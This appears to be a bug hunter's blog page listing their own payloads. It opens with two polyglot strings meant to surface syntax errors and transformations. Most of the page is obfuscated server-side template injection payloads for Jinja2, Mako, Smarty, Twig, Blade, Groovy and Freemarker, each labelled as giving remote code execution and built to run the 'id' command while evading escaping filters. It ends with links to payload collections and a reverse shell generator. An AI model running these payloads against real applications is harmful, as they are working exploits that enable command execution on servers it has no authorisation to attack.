---
# the default layout is 'page'
icon: fa-solid fa-book-skull
order: 3
---

A list of payloads that I do use when hunting for vulnerabilities. Personaly, I rarly use exploitation payloads but instead detection payloads.

> All payloads shown on this page are created by me. I provide a basic overview of my payloads, exploitation payloads and more advanced detection payloads will not be shared.
{{'{'}}: .prompt-info }

## Polyglot payloads
> This payload focuses on the detection of syntax errors

```brainfuck
<z>"z'z`%}})z${{'{'}}{{'{'}}z\
```

> This payload focuses on detecting transformation that can be used in future attacks

```brainfuck
tfmtstart%255Az%5Az\x5Az\u005Az%26%23x5A%3Btfmtend
```

## Server Side Template Injection (SSTI)
### Double template rendering payloads

> Some of the indexes used in the payload to extract characters for strings may need to be changed depending on the application you are using.
{: .prompt-info }

> These payloads can be used to bypass `autoescape` / `html escape` filters.
{: .prompt-tip }


#### Jinja2

**Impact:** Remote Code Execution (RCE)

```python
{{'{'}}{{'{'}}self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[150:152]+self.__init__.__globals__.__str__()[694]).read()}}
```

#### Mako

**Impact:** Remote Code Execution (RCE)

```python
${{'{'}}self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

#### Smarty

**Impact:** Remote Code Execution (RCE)

```php
{{'{'}}{{'{'}}passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

#### Twig

**Impact:** Remote Code Execution (RCE)

```php
{{'{'}}{{'{'}}id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
```
```php
{{'{'}}%block U%}id000passthru{{'{'}}%endblock%}{{'{'}}%set x=block(_charset|first)|split(000)%}{{'{'}}{{'{'}}[x|first]|map(x|last)|join}}
```

####  Blade

**Impact:** Remote Code Execution (RCE)

```php
{{'{'}}{{'{'}}passthru(implode(Null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
```

#### Groovy

**Impact:** Remote Code Execution (RCE)

```javascript
${{'{'}}x=new String();for(i in[105,100]){{'{'}}x+=((char)i).toString()};x.execute().text}
```

#### Freemarker

**Impact:** Remote Code Execution (RCE)

```java
${{'{'}}(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
```

You can find a lot of great resources related to payloads below.
- [Payloads All The Things
](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Reverse Shell Generator](https://www.revshells.com/)

